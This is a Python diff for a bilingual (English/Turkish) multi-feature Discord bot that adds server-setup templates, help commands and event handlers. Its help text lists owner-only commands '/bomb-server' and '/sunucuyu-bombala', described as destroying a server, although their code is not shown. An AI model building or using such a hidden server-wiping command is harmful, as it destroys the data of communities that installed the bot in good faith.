+    await interaction.response.defer(ephemeral=True)
+    
+    guild = interaction.guild
+    
+    # Create category
+    category_name = "📁・TEXT CHANNELS" if lang == "en" else "📁・METİN KANALLARI"
+    category = await guild.create_category(category_name)
+    
+    # Create basic channels
+    channels = [
+        ("📢・announcements", "Server announcements"),
+        ("📜・rules", "Server rules"),
+        ("💬・general", "General chat"),
+        ("🤖・commands", "Bot commands"),
+        ("🎮・gaming", "Gaming chat"),
+        ("📸・media", "Share your media"),
+        ("🔊・voice-chat", "Voice chat")
+    ]
+    
+    if lang == "tr":
+        channels = [
+            ("📢・duyurular", "Sunucu duyuruları"),
+            ("📜・kurallar", "Sunucu kuralları"),
+            ("💬・genel", "Genel sohbet"),
+            ("🤖・komutlar", "Bot komutları"),
+            ("🎮・oyun", "Oyun sohbeti"),
+            ("📸・medya", "Medya paylaşımı"),
+            ("🔊・ses-sohbet", "Ses sohbeti")
+        ]
+    
+    created_channels = []
+    for name, topic in channels:
+        channel = await category.create_text_channel(name, topic=topic)
+        created_channels.append(channel.mention)
+    
+    # Create voice category
+    voice_category_name = "🔊・VOICE CHANNELS" if lang == "en" else "🔊・SES KANALLARI"
+    voice_category = await guild.create_category(voice_category_name)
+    
+    # Create voice channels
+    voice_channels = ["General VC", "Gaming VC", "Chill VC"]
+    if lang == "tr":
+        voice_channels = ["Genel Ses", "Oyun Ses", "Rahat Ses"]
+    
+    for vc_name in voice_channels:
+        await voice_category.create_voice_channel(vc_name)
+    
+    # Create roles
+    roles = ["Admin", "Moderator", "Member", "VIP"]
+    if lang == "tr":
+        roles = ["Yönetici", "Moderatör", "Üye", "VIP"]
+    
+    created_roles = []
+    for role_name in roles:
+        role = await guild.create_role(name=role_name)
+        created_roles.append(role.name)
+    
+    # Send summary
+    embed = discord.Embed(
+        title="✅ Basic Setup Complete" if lang == "en" else "✅ Temel Kurulum Tamamlandı",
+        color=discord.Color.green()
+    )
+    embed.add_field(
+        name="Created Categories" if lang == "en" else "Oluşturulan Kategoriler",
+        value=f"• {category.name}\n• {voice_category.name}",
+        inline=False
+    )
+    embed.add_field(
+        name="Created Channels" if lang == "en" else "Oluşturulan Kanallar",
+        value="\n".join(created_channels),
+        inline=False
+    )
+    embed.add_field(
+        name="Created Roles" if lang == "en" else "Oluşturulan Roller",
+        value=", ".join(created_roles),
+        inline=False
+    )
+    embed.add_field(
+        name="Next Steps" if lang == "en" else "Sonraki Adımlar",
+        value=(
+            "1. Set up permissions for each role\n"
+            "2. Configure channel permissions\n"
+            "3. Set up verification system\n"
+            "4. Add welcome message"
+        ) if lang == "en" else (
+            "1. Her rol için izinleri ayarlayın\n"
+            "2. Kanal izinlerini yapılandırın\n"
+            "3. Doğrulama sistemini kurun\n"
+            "4. Karşılama mesajı ekleyin"
+        ),
+        inline=False
+    )
+    
+    await interaction.followup.send(embed=embed, ephemeral=True)
+
+async def setup_gaming_channels(interaction: discord.Interaction, lang: str):
+    """Create gaming-focused server channels"""
+    await interaction.response.defer(ephemeral=True)
+    
+    guild = interaction.guild
+    
+    # Create gaming category
+    category_name = "🎮・GAMING" if lang == "en" else "🎮・OYUN"
+    category = await guild.create_category(category_name)
+    
+    # Create gaming channels
+    channels = [
+        ("🎮・general-gaming", "General gaming discussion"),
+        ("📢・announcements", "Tournament announcements"),
+        ("🏆・tournaments", "Tournament information"),
+        ("🤝・looking-for-team", "Find teammates"),
+        ("🎯・clips-and-highlights", "Share your epic moments"),
+        ("💬・voice-chat-1", "Voice channel 1"),
+        ("💬・voice-chat-2", "Voice channel 2"),
+        ("🎙️・stream-announcements", "Stream announcements")
+    ]
+    
+    if lang == "tr":
+        channels = [
+            ("🎮・genel-oyun", "Genel oyun tartışması"),
+            ("📢・duyurular", "Turnuva duyuruları"),
+            ("🏆・turnuvalar", "Turnuva bilgileri"),
+            ("🤝・takım-ara", "Takım arkadaşı bul"),
+            ("🎯・klipler-ve-anlar", "Epik anlarını paylaş"),
+            ("💬・ses-sohbet-1", "Ses kanalı 1"),
+            ("💬・ses-sohbet-2", "Ses kanalı 2"),
+            ("🎙️・yayın-duyuruları", "Yayın duyuruları")
+        ]
+    
+    created_channels = []
+    for name, topic in channels:
+        if "voice" in name or "ses" in name:
+            channel = await category.create_voice_channel(name.replace("💬・", "").replace("・", "-"))
+        else:
+            channel = await category.create_text_channel(name, topic=topic)
+        created_channels.append(channel.mention if hasattr(channel, 'mention') else channel.name)
+    
+    # Create game-specific categories
+    games = ["VALORANT", "League of Legends", "CS:GO", "Minecraft", "Fortnite"]
+    
+    for game in games:
+        game_category = await guild.create_category(f"🎮・{game}")
+        await game_category.create_text_channel(f"💬・{game.lower().replace(' ', '-')}-chat")
+        await game_category.create_text_channel(f"📢・{game.lower().replace(' ', '-')}-announcements")
+        await game_category.create_voice_channel(f"🔊・{game.lower().replace(' ', '-')}-voice")
+    
+    # Create gaming roles
+    roles = ["Pro Player", "Streamer", "Tournament Organizer", "Coach", "Casual Gamer"]
+    if lang == "tr":
+        roles = ["Profesyonel Oyuncu", "Yayıncı", "Turnuva Organizatörü", "Koç", "Sıradan Oyuncu"]
+    
+    created_roles = []
+    for role_name in roles:
+        role = await guild.create_role(name=role_name)
+        created_roles.append(role.name)
+    
+    # Send summary
+    embed = discord.Embed(
+        title="✅ Gaming Setup Complete" if lang == "en" else "✅ Oyun Kurulumu Tamamlandı",
+        color=discord.Color.green()
+    )
+    embed.add_field(
+        name="Main Categories" if lang == "en" else "Ana Kategoriler",
+        value=f"• {category.name}\n• 5 Game-specific categories",
+        inline=False
+    )
+    embed.add_field(
+        name="Gaming Channels" if lang == "en" else "Oyun Kanalları",
+        value="\n".join(created_channels[:5]) + "\n...",
+        inline=False
+    )
+    embed.add_field(
+        name="Gaming Roles" if lang == "en" else "Oyun Rolleri",
+        value=", ".join(created_roles),
+        inline=False
+    )
+    
+    await interaction.followup.send(embed=embed, ephemeral=True)
+
+async def setup_business_channels(interaction: discord.Interaction, lang: str):
+    """Create business-focused server channels"""
+    await interaction.response.defer(ephemeral=True)
+    
+    guild = interaction.guild
+    
+    # Create business category
+    category_name = "💼・BUSINESS" if lang == "en" else "💼・İŞ"
+    category = await guild.create_category(category_name)
+    
+    # Create business channels
+    channels = [
+        ("📢・announcements", "Company announcements"),
+        ("📋・projects", "Project discussions"),
+        ("🤝・meetings", "Meeting schedules"),
+        ("📊・reports", "Business reports"),
+        ("💡・ideas", "Share your ideas"),
+        ("🎯・goals", "Company goals"),
+        ("📈・progress", "Progress tracking"),
+        ("🔒・confidential", "Confidential discussions")
+    ]
+    
+    if lang == "tr":
+        channels = [
+            ("📢・duyurular", "Şirket duyuruları"),
+            ("📋・projeler", "Proje tartışmaları"),
+            ("🤝・toplantılar", "Toplantı programları"),
+            ("📊・raporlar", "İş raporları"),
+            ("💡・fikirler", "Fikirlerinizi paylaşın"),
+            ("🎯・hedefler", "Şirket hedefleri"),
+            ("📈・ilerleme", "İlerleme takibi"),
+            ("🔒・gizli", "Gizli tartışmalar")
+        ]
+    
+    created_channels = []
+    for name, topic in channels:
+        channel = await category.create_text_channel(name, topic=topic)
+        created_channels.append(channel.mention)
+    
+    # Create department categories
+    departments = ["HR", "Marketing", "Development", "Sales", "Support"]
+    if lang == "tr":
+        departments = ["İK", "Pazarlama", "Geliştirme", "Satış", "Destek"]
+    
+    for dept in departments:
+        dept_category = await guild.create_category(f"🏢・{dept}")
+        await dept_category.create_text_channel(f"💬・{dept.lower()}-chat")
+        await dept_category.create_text_channel(f"📁・{dept.lower()}-files")
+        await dept_category.create_voice_channel(f"🗣️・{dept.lower()}-meetings")
+    
+    # Create business roles
+    roles = ["CEO", "Manager", "Team Lead", "Employee", "Intern"]
+    if lang == "tr":
+        roles = ["CEO", "Yönetici", "Takım Lideri", "Çalışan", "Stajyer"]
+    
+    created_roles = []
+    for role_name in roles:
+        role = await guild.create_role(name=role_name)
+        created_roles.append(role.name)
+    
+    # Send summary
+    embed = discord.Embed(
+        title="✅ Business Setup Complete" if lang == "en" else "✅ İş Kurulumu Tamamlandı",
+        color=discord.Color.green()
+    )
+    embed.add_field(
+        name="Main Categories" if lang == "en" else "Ana Kategoriler",
+        value=f"• {category.name}\n• 5 Department categories",
+        inline=False
+    )
+    embed.add_field(
+        name="Business Channels" if lang == "en" else "İş Kanalları",
+        value="\n".join(created_channels[:5]) + "\n...",
+        inline=False
+    )
+    embed.add_field(
+        name="Business Roles" if lang == "en" else "İş Rolleri",
+        value=", ".join(created_roles),
+        inline=False
+    )
+    
+    await interaction.followup.send(embed=embed, ephemeral=True)
+
+async def setup_music_channels(interaction: discord.Interaction, lang: str):
+    """Create music-focused server channels"""
+    await interaction.response.defer(ephemeral=True)
+    
+    guild = interaction.guild
+    
+    # Create music category
+    category_name = "🎵・MUSIC" if lang == "en" else "🎵・MÜZİK"
+    category = await guild.create_category(category_name)
+    
+    # Create music channels
+    channels = [
+        ("🎶・music-chat", "Discuss music"),
+        ("🎧・recommendations", "Music recommendations"),
+        ("🎸・genres", "Genre discussions"),
+        ("🎤・karaoke", "Karaoke sessions"),
+        ("📻・radio", "Radio station"),
+        ("🎼・lyrics", "Share lyrics"),
+        ("🎹・instruments", "Instrument discussions"),
+        ("🎚️・music-production", "Music production")
+    ]
+    
+    if lang == "tr":
+        channels = [
+            ("🎶・müzik-sohbet", "Müzik tartışması"),
+            ("🎧・öneriler", "Müzik önerileri"),
+            ("🎸・türler", "Tür tartışmaları"),
+            ("🎤・karaoke", "Karaoke seansları"),
+            ("📻・radyo", "Radyo istasyonu"),
+            ("🎼・şarkı-sözleri", "Şarkı sözleri paylaşımı"),
+            ("🎹・enstrümanlar", "Enstrüman tartışmaları"),
+            ("🎚️・müzik-yapımı", "Müzik yapımı")
+        ]
+    
+    created_channels = []
+    for name, topic in channels:
+        channel = await category.create_text_channel(name, topic=topic)
+        created_channels.append(channel.mention)
+    
+    # Create voice channels for music
+    voice_channels = ["🎵・Lounge", "🎶・Chill", "🎸・Rock", "🎤・Karaoke", "🎧・Party"]
+    if lang == "tr":
+        voice_channels = ["🎵・Lounge", "🎶・Rahat", "🎸・Rock", "🎤・Karaoke", "🎧・Parti"]
+    
+    for vc_name in voice_channels:
+        await category.create_voice_channel(vc_name)
+    
+    # Create genre roles
+    genres = ["Rock", "Pop", "Hip-Hop", "Jazz", "Classical", "Electronic", "Metal", "Indie"]
+    
+    created_roles = []
+    for genre in genres:
+        role = await guild.create_role(name=f"🎵 {genre}")
+        created_roles.append(role.name)
+    
+    # Send summary
+    embed = discord.Embed(
+        title="✅ Music Setup Complete" if lang == "en" else "✅ Müzik Kurulumu Tamamlandı",
+        color=discord.Color.green()
+    )
+    embed.add_field(
+        name="Music Category" if lang == "en" else "Müzik Kategorisi",
+        value=category.name,
+        inline=False
+    )
+    embed.add_field(
+        name="Text Channels" if lang == "en" else "Metin Kanalları",
+        value="\n".join(created_channels[:4]) + "\n...",
+        inline=False
+    )
+    embed.add_field(
+        name="Voice Channels" if lang == "en" else "Ses Kanalları",
+        value="\n".join(voice_channels),
+        inline=False
+    )
+    embed.add_field(
+        name="Genre Roles" if lang == "en" else "Tür Rolleri",
+        value=", ".join(created_roles[:6]) + "...",
+        inline=False
+    )
+    
+    await interaction.followup.send(embed=embed, ephemeral=True)
+
+async def setup_community_channels(interaction: discord.Interaction, lang: str):
+    """Create community-focused server channels"""
+    await interaction.response.defer(ephemeral=True)
+    
+    guild = interaction.guild
+    
+    # Create community category
+    category_name = "🎭・COMMUNITY" if lang == "en" else "🎭・TOPLULUK"
+    category = await guild.create_category(category_name)
+    
+    # Create community channels
+    channels = [
+        ("👋・introductions", "Introduce yourself"),
+        ("🎉・events", "Community events"),
+        ("📸・photos", "Share photos"),
+        ("🎮・gaming", "Gaming together"),
+        ("🎬・movies", "Movie discussions"),
+        ("📚・books", "Book club"),
+        ("🍳・cooking", "Cooking recipes"),
+        ("🏋️・fitness", "Fitness challenges")
+    ]
+    
+    if lang == "tr":
+        channels = [
+            ("👋・tanışma", "Kendinizi tanıtın"),
+            ("🎉・etkinlikler", "Topluluk etkinlikleri"),
+            ("📸・fotoğraflar", "Fotoğraf paylaşımı"),
+            ("🎮・oyun", "Birlikte oyun"),
+            ("🎬・filmler", "Film tartışmaları"),
+            ("📚・kitaplar", "Kitap kulübü"),
+            ("🍳・yemek", "Yemek tarifleri"),
+            ("🏋️・fitness", "Fitness mücadelesi")
+        ]
+    
+    created_channels = []
+    for name, topic in channels:
+        channel = await category.create_text_channel(name, topic=topic)
+        created_channels.append(channel.mention)
+    
+    # Create voice channels
+    voice_channels = ["🗣️・General", "🎮・Gaming", "🎬・Movie Night", "🎵・Music", "☕・Chill"]
+    if lang == "tr":
+        voice_channels = ["🗣️・Genel", "🎮・Oyun", "🎬・Film Gecesi", "🎵・Müzik", "☕・Rahat"]
+    
+    for vc_name in voice_channels:
+        await category.create_voice_channel(vc_name)
+    
+    # Create community roles
+    roles = ["Event Organizer", "Content Creator", "Helper", "Regular", "New Member"]
+    if lang == "tr":
+        roles = ["Etkinlik Organizatörü", "İçerik Üretici", "Yardımcı", "Düzenli", "Yeni Üye"]
+    
+    created_roles = []
+    for role_name in roles:
+        role = await guild.create_role(name=role_name)
+        created_roles.append(role.name)
+    
+    # Send summary
+    embed = discord.Embed(
+        title="✅ Community Setup Complete" if lang == "en" else "✅ Topluluk Kurulumu Tamamlandı",
+        color=discord.Color.green()
+    )
+    embed.add_field(
+        name="Community Category" if lang == "en" else "Topluluk Kategorisi",
+        value=category.name,
+        inline=False
+    )
+    embed.add_field(
+        name="Community Channels" if lang == "en" else "Topluluk Kanalları",
+        value="\n".join(created_channels[:4]) + "\n...",
+        inline=False
+    )
+    embed.add_field(
+        name="Voice Channels" if lang == "en" else "Ses Kanalları",
+        value="\n".join(voice_channels),
+        inline=False
+    )
+    embed.add_field(
+        name="Community Roles" if lang == "en" else "Topluluk Rolleri",
+        value=", ".join(created_roles),
+        inline=False
+    )
+    
+    await interaction.followup.send(embed=embed, ephemeral=True)
+
+class CustomSetupModal(discord.ui.Modal):
+    """Modal for custom server setup"""
+    def __init__(self, lang: str = "en"):
+        self.lang = lang
+        title = "Custom Server Setup" if lang == "en" else "Özel Sunucu Kurulumu"
+        super().__init__(title=title)
+        
+        self.category_name = discord.ui.TextInput(
+            label="Category Name" if lang == "en" else "Kategori Adı",
+            placeholder="Enter category name..." if lang == "en" else "Kategori adını girin...",
+            required=True
+        )
+        self.add_item(self.category_name)
+        
+        self.channel_names = discord.ui.TextInput(
+            label="Channel Names (comma separated)" if lang == "en" else "Kanal Adları (virgülle ayrılmış)",
+            placeholder="general, announcements, voice-chat" if lang == "en" else "genel, duyurular, ses-sohbet",
+            required=True
+        )
+        self.add_item(self.channel_names)
+        
+        self.role_names = discord.ui.TextInput(
+            label="Role Names (comma separated)" if lang == "en" else "Rol Adları (virgülle ayrılmış)",
+            placeholder="Admin, Moderator, Member" if lang == "en" else "Yönetici, Moderatör, Üye",
+            required=False
+        )
+        self.add_item(self.role_names)
+    
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+        
+        guild = interaction.guild
+        
+        # Create category
+        category = await guild.create_category(self.category_name.value)
+        
+        # Create channels
+        channel_names = [name.strip() for name in self.channel_names.value.split(',')]
+        created_channels = []
+        
+        for name in channel_names:
+            if "voice" in name.lower() or "ses" in name.lower():
+                channel = await category.create_voice_channel(name.strip())
+            else:
+                channel = await category.create_text_channel(name.strip())
+            created_channels.append(channel.mention if hasattr(channel, 'mention') else channel.name)
+        
+        # Create roles if provided
+        created_roles = []
+        if self.role_names.value:
+            role_names = [name.strip() for name in self.role_names.value.split(',')]
+            for role_name in role_names:
+                role = await guild.create_role(name=role_name)
+                created_roles.append(role.name)
+        
+        # Send summary
+        embed = discord.Embed(
+            title="✅ Custom Setup Complete" if self.lang == "en" else "✅ Özel Kurulum Tamamlandı",
+            color=discord.Color.green()
+        )
+        embed.add_field(
+            name="Category" if self.lang == "en" else "Kategori",
+            value=category.name,
+            inline=False
+        )
+        embed.add_field(
+            name="Channels" if self.lang == "en" else "Kanallar",
+            value="\n".join(created_channels),
+            inline=False
+        )
+        if created_roles:
+            embed.add_field(
+                name="Roles" if self.lang == "en" else "Roller",
+                value=", ".join(created_roles),
+                inline=False
+            )
+        
+        await interaction.followup.send(embed=embed, ephemeral=True)
+
+async def show_custom_setup_modal(interaction: discord.Interaction, lang: str):
+    """Show custom setup modal"""
+    modal = CustomSetupModal(lang)
+    await interaction.response.send_modal(modal)
+
+@bot.tree.command(name="server-setup", description="Setup your server with pre-configured templates")
+async def server_setup(interaction: discord.Interaction):
+    """Setup your server with pre-configured templates"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    # Check permissions
+    if not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("You need administrator permissions to use this command.", ephemeral=True)
+        return
+    
+    embed = discord.Embed(
+        title="🏗️ Server Setup",
+        description="Choose a setup template for your server:",
+        color=discord.Color.blue()
+    )
+    embed.add_field(
+        name="📋 Basic Setup",
+        value="Creates essential channels and roles for a new server.",
+        inline=False
+    )
+    embed.add_field(
+        name="🎮 Gaming Setup",
+        value="Creates gaming-focused channels, categories, and roles.",
+        inline=False
+    )
+    embed.add_field(
+        name="💼 Business Setup",
+        value="Creates professional channels for business use.",
+        inline=False
+    )
+    embed.add_field(
+        name="🎵 Music Setup",
+        value="Creates music-focused channels and genre roles.",
+        inline=False
+    )
+    embed.add_field(
+        name="🎭 Community Setup",
+        value="Creates community-focused channels for engagement.",
+        inline=False
+    )
+    embed.add_field(
+        name="🔧 Custom Setup",
+        value="Create your own custom setup with specific channels.",
+        inline=False
+    )
+    embed.set_footer(text="This may take a few moments to complete.")
+    
+    view = ServerSetupView(lang="en")
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+
+@bot.tree.command(name="sunucu-kurulumu", description="Sunucunuzu önceden yapılandırılmış şablonlarla kurun")
+async def sunucu_kurulumu(interaction: discord.Interaction):
+    """Sunucunuzu önceden yapılandırılmış şablonlarla kurun"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    # Check permissions
+    if not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("Bu komutu kullanmak için yönetici izinlerine ihtiyacınız var.", ephemeral=True)
+        return
+    
+    embed = discord.Embed(
+        title="🏗️ Sunucu Kurulumu",
+        description="Sunucunuz için bir kurulum şablonu seçin:",
+        color=discord.Color.blue()
+    )
+    embed.add_field(
+        name="📋 Temel Kurulum",
+        value="Yeni bir sunucu için temel kanallar ve roller oluşturur.",
+        inline=False
+    )
+    embed.add_field(
+        name="🎮 Oyun Kurulumu",
+        value="Oyun odaklı kanallar, kategoriler ve roller oluşturur.",
+        inline=False
+    )
+    embed.add_field(
+        name="💼 İş Kurulumu",
+        value="İş kullanımı için profesyonel kanallar oluşturur.",
+        inline=False
+    )
+    embed.add_field(
+        name="🎵 Müzik Kurulumu",
+        value="Müzik odaklı kanallar ve tür rolleri oluşturur.",
+        inline=False
+    )
+    embed.add_field(
+        name="🎭 Topluluk Kurulumu",
+        value="Katılım için topluluk odaklı kanallar oluşturur.",
+        inline=False
+    )
+    embed.add_field(
+        name="🔧 Özel Kurulum",
+        value="Belirli kanallarla kendi özel kurulumunuzu oluşturun.",
+        inline=False
+    )
+    embed.set_footer(text="Bu işlemin tamamlanması birkaç dakika sürebilir.")
+    
+    view = ServerSetupView(lang="tr")
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+
+# Help Command with all features
+@bot.tree.command(name="help", description="Show all available commands")
+async def help_command(interaction: discord.Interaction):
+    """Show all available commands"""
+    embed = discord.Embed(
+        title="🤖 Bot Help - Available Commands",
+        description="Here are all the commands you can use:",
+        color=discord.Color.blue()
+    )
+    
+    # Music Commands
+    embed.add_field(
+        name="🎵 Music Commands",
+        value=(
+            "`/play <url>` - Play music from URL\n"
+            "`/pause` - Pause current music\n"
+            "`/resume` - Resume paused music\n"
+            "`/skip` - Skip current song\n"
+            "`/queue` - Show music queue\n"
+            "`/loop` - Toggle queue loop\n"
+            "`/stop` - Stop music and disconnect\n"
+            "`/volume <1-100>` - Set volume\n"
+            "`/music-menu` - Music control menu\n"
+        ),
+        inline=False
+    )
+    
+    # Server Setup Commands
+    embed.add_field(
+        name="🏗️ Server Setup Commands",
+        value=(
+            "`/server-setup` - Setup server with templates\n"
+            "`/sunucu-kurulumu` - Sunucu kurulum şablonları\n"
+        ),
+        inline=False
+    )
+    
+    # Notification Commands
+    embed.add_field(
+        name="📢 Notification Commands",
+        value=(
+            "`/twitch-notification-channel-setup` - Twitch notifications\n"
+            "`/kick-notification-channel-setup` - Kick notifications\n"
+            "`/youtube-notification-channel-setup` - YouTube notifications\n"
+            "`/twitch-bildirim-kanalı-kurulum` - Twitch bildirimleri\n"
+            "`/kick-bildirim-kanalı-kurulum` - Kick bildirimleri\n"
+            "`/youtube-bildirim-kanalı-kurulum` - YouTube bildirimleri\n"
+        ),
+        inline=False
+    )
+    
+    # Feedback Commands
+    embed.add_field(
+        name="📩 Feedback Commands",
+        value=(
+            "`/feedback` - Send feedback to bot owner\n"
+            "`/geri-bildirim` - Bot sahibine geri bildirim gönder\n"
+            "`/feedback-read <id> <message>` - Respond to feedback (Owner)\n"
+            "`/geri-bildirim-okundu <id> <mesaj>` - Geri bildirime yanıt ver (Sahip)\n"
+            "`/write-dm <user_id> <message>` - Send DM to user (Owner)\n"
+            "`/dm-yaz <kullanıcı_id> <mesaj>` - Kullanıcıya DM gönder (Sahip)\n"
+        ),
+        inline=False
+    )
+    
+    # Verification Commands
+    embed.add_field(
+        name="🔐 Verification Commands",
+        value=(
+            "`/verify` - Complete verification\n"
+            "`/doğrula` - Doğrulama yap\n"
+        ),
+        inline=False
+    )
+    
+    # AI Commands
+    embed.add_field(
+        name="🤖 AI Commands",
+        value=(
+            "`/ai-info` - AI service information\n"
+            "`/ai-bilgi` - AI hizmeti bilgileri\n"
+        ),
+        inline=False
+    )
+    
+    # Owner Commands
+    embed.add_field(
+        name="⚙️ Owner Commands",
+        value=(
+            "`/feedback-ban <user_id> <time>` - Ban from feedback\n"
+            "`/geri-bildirim-engelle <kullanıcı_id> <süre>` - Geri bildirimden engelle\n"
+            "`/reset-bot` - Reset bot data\n"
+            "`/bomb-server` - Destroy a server\n"
+            "`/sunucuyu-bombala` - Bir sunucuyu yok et\n"
+        ),
+        inline=False
+    )
+    
+    # Utility Commands
+    embed.add_field(
+        name="🔧 Utility Commands",
+        value=(
+            "`/help` - Show this help message\n"
+            "`/yardım` - Yardım mesajını göster\n"
+        ),
+        inline=False
+    )
+    
+    embed.set_footer(text="Bot Prefix: / • Use /yardım for Turkish help")
+    
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="yardım", description="Kullanılabilir tüm komutları göster")
+async def yardım_command(interaction: discord.Interaction):
+    """Kullanılabilir tüm komutları göster"""
+    embed = discord.Embed(
+        title="🤖 Bot Yardım - Kullanılabilir Komutlar",
+        description="Kullanabileceğiniz tüm komutlar:",
+        color=discord.Color.blue()
+    )
+    
+    # Müzik Komutları
+    embed.add_field(
+        name="🎵 Müzik Komutları",
+        value=(
+            "`/çal <url>` - URL'den müzik çal\n"
+            "`/duraklat` - Mevcut müziği duraklat\n"
+            "`/devam` - Duraklatılmış müziği devam ettir\n"
+            "`/atla` - Şuanki şarkıyı atla\n"
+            "`/sıra` - Müzik sırasını göster\n"
+            "`/döngü` - Sıra döngüsünü aç/kapat\n"
+            "`/durdur` - Müziği durdur ve bağlantıyı kes\n"
+            "`/ses <1-100>` - Ses seviyesini ayarla\n"
+            "`/müzik-menüsü` - Müzik kontrol menüsü\n"
+        ),
+        inline=False
+    )
+    
+    # Sunucu Kurulum Komutları
+    embed.add_field(
+        name="🏗️ Sunucu Kurulum Komutları",
+        value=(
+            "`/sunucu-kurulumu` - Şablonlarla sunucu kur\n"
+            "`/server-setup` - Server setup templates\n"
+        ),
+        inline=False
+    )
+    
+    # Bildirim Komutları
+    embed.add_field(
+        name="📢 Bildirim Komutları",
+        value=(
+            "`/twitch-bildirim-kanalı-kurulum` - Twitch bildirimleri\n"
+            "`/kick-bildirim-kanalı-kurulum` - Kick bildirimleri\n"
+            "`/youtube-bildirim-kanalı-kurulum` - YouTube bildirimleri\n"
+            "`/twitch-notification-channel-setup` - Twitch notifications\n"
+            "`/kick-notification-channel-setup` - Kick notifications\n"
+            "`/youtube-notification-channel-setup` - YouTube notifications\n"
+        ),
+        inline=False
+    )
+    
+    # Geri Bildirim Komutları
+    embed.add_field(
+        name="📩 Geri Bildirim Komutları",
+        value=(
+            "`/geri-bildirim` - Bot sahibine geri bildirim gönder\n"
+            "`/feedback` - Send feedback to bot owner\n"
+            "`/geri-bildirim-okundu <id> <mesaj>` - Geri bildirime yanıt ver (Sahip)\n"
+            "`/feedback-read <id> <message>` - Respond to feedback (Owner)\n"
+            "`/dm-yaz <kullanıcı_id> <mesaj>` - Kullanıcıya DM gönder (Sahip)\n"
+            "`/write-dm <user_id> <message>` - Send DM to user (Owner)\n"
+        ),
+        inline=False
+    )
+    
+    # Doğrulama Komutları
+    embed.add_field(
+        name="🔐 Doğrulama Komutları",
+        value=(
+            "`/doğrula` - Doğrulama yap\n"
+            "`/verify` - Complete verification\n"
+        ),
+        inline=False
+    )
+    
+    # AI Komutları
+    embed.add_field(
+        name="🤖 AI Komutları",
+        value=(
+            "`/ai-bilgi` - AI hizmeti bilgileri\n"
+            "`/ai-info` - AI service information\n"
+        ),
+        inline=False
+    )
+    
+    # Sahip Komutları
+    embed.add_field(
+        name="⚙️ Sahip Komutları",
+        value=(
+            "`/geri-bildirim-engelle <kullanıcı_id> <süre>` - Geri bildirimden engelle\n"
+            "`/feedback-ban <user_id> <time>` - Ban from feedback\n"
+            "`/reset-bot` - Bot verilerini sıfırla\n"
+            "`/sunucuyu-bombala` - Bir sunucuyu yok et\n"
+            "`/bomb-server` - Destroy a server\n"
+        ),
+        inline=False
+    )
+    
+    # Yardımcı Komutları
+    embed.add_field(
+        name="🔧 Yardımcı Komutları",
+        value=(
+            "`/yardım` - Bu yardım mesajını göster\n"
+            "`/help` - Show help message\n"
+        ),
+        inline=False
+    )
+    
+    embed.set_footer(text="Bot Öneki: / • İngilizce yardım için /help kullanın")
+    
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+# Event: On bot ready
+@bot.event
+async def on_ready():
+    """Called when bot is ready"""
+    print(f'✅ {bot.user} has connected to Discord!')
+    print(f'📊 Bot is in {len(bot.guilds)} servers')
+    
+    # Sync commands
+    try:
+        synced = await bot.tree.sync()
+        print(f'✅ Synced {len(synced)} commands')
+    except Exception as e:
+        print(f'❌ Error syncing commands: {e}')
+    
+    # Set bot status
+    await bot.change_presence(
+        activity=discord.Activity(
+            type=discord.ActivityType.listening,
+            name="/help | Multi-Feature Bot"
+        )
+    )
+
+# Event: On guild join
+@bot.event
+async def on_guild_join(guild):
+    """Called when bot joins a guild"""
+    print(f'✅ Joined new guild: {guild.name} (ID: {guild.id})')
+    
+    # Find a channel to send welcome message
+    welcome_channel = None
+    for channel in guild.text_channels:
+        if channel.permissions_for(guild.me).send_messages:
+            welcome_channel = channel
+            break
+    
+    if welcome_channel:
+        embed = discord.Embed(
+            title="🤖 Thanks for adding me!",
+            description=(
+                "Hello! I'm a multi-feature Discord bot with:\n"
+                "• 🎵 Music playback\n"
+                "• 🏗️ Server setup templates\n"
+                "• 📢 Stream notifications\n"
+                "• 🔐 Verification system\n"
+                "• 📩 Feedback system\n"
+                "• ⚙️ And much more!\n\n"
+                "**Get started with:**\n"
+                "`/verify` - Complete verification first\n"
+                "`/help` - See all commands\n"
+                "`/server-setup` - Setup your server\n\n"
+                "**Note:** Some commands require verification first!"
+            ),
+            color=discord.Color.blue()
+        )
+        
+        # Create translate view for welcome message
+        view = TranslateView(
+            "Thanks for adding me! I'm a multi-feature bot with music, server setup, notifications, and more. Use `/verify` to get started!",
+            "Beni eklediğiniz için teşekkürler! Müzik, sunucu kurulumu, bildirimler ve daha fazlasına sahip çok özellikli bir botum. Başlamak için `/doğrula` kullanın!"
+        )
+        
+        await welcome_channel.send(embed=embed, view=view)
+    
+    # Give 10000 Sampy Coin to the user who added the bot (if we can identify them)
+    # Note: Discord doesn't provide who added the bot, so we can't implement this directly
+    # This would require tracking through audit logs or other methods
+
+# Event: On voice state update
+@bot.event
+async def on_voice_state_update(member, before, after):
+    """Handle voice state updates for temp rooms and idle disconnect"""
+    # Temp room handling
+    if member.guild.id in temp_rooms and before.channel:
+        temp_room_info = temp_rooms[member.guild.id]
+        if before.channel.id == temp_room_info['voice_channel_id']:
+            # Check if temp room is empty
+            voice_channel = before.channel
+            if len(voice_channel.members) == 0:
+                # Delete temp room after delay
+                await asyncio.sleep(5)  # 5 second delay
+                voice_channel = bot.get_channel(temp_room_info['voice_channel_id'])
+                if voice_channel and len(voice_channel.members) == 0:
+                    try:
+                        # Delete text channel if exists
+                        if temp_room_info['text_channel_id']:
+                            text_channel = bot.get_channel(temp_room_info['text_channel_id'])
+                            if text_channel:
+                                await text_channel.delete()
+                        
+                        # Delete voice channel
+                        await voice_channel.delete()
+                        
+                        # Remove from temp rooms
+                        del temp_rooms[member.guild.id]
+                    except:
+                        pass
+    
+    # Music idle disconnect check
+    if member.guild.voice_client and member.guild.voice_client.channel:
+        if before.channel == member.guild.voice_client.channel:
+            # Check if bot is alone in voice channel
+            if len(member.guild.voice_client.channel.members) == 1:
+                # Start idle timer
+                guild_id = member.guild.id
+                if guild_id not in idle_timers:
+                    idle_timers[guild_id] = asyncio.create_task(
+                        idle_disconnect(member.guild, member.guild.voice_client)
+                    )
+
